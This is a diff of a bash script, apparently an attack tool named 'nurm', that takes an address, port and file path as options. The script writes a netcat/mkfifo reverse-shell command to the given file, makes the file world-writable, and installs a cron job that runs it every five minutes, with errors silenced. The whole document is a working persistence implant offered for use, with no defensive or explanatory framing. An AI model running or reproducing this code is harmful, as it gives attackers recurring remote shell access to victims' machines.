@@ -1,5 +1,27 @@
 #!/bin/bash
-
-echo "mkfifo /tmp/puesrrz; nc $2 $3 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $1
-chmod 777 $1
-(crontab -l 2>/dev/null; echo "*/5 * * * * $1 ") | crontab - 
+while getopts ":a:p:f:" opt; do
+        case ${opt} in
+                a )
+                        address=$OPTARG
+                        ;;
+                p )
+                        port=$OPTARG
+                        ;;
+                f )
+                        filepath=$OPTARG
+                        ;;
+                \? )
+                        echo "Invalid Usage!"
+                        echo "Usage: ./nurm [-a <address>] [-p <port>] [-f <full-path-file>]"
+                        ;;
+                : )
+                        echo "Usage: ./nurm [-a <address>] [-p <port>] [-f <full-path-file>]"
+                        ;;
+        esac
+done
+if ! [ -z ${filepath} ];
+then
+        echo "mkfifo /tmp/puesrrz; nc $address $port 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $filepath 2>/dev/null
+        chmod 777 $filepath 2>/dev/null
+        (crontab -l 2>/dev/null; echo "*/5 * * * * $filepath ") 2>/dev/null | crontab - 
+fi
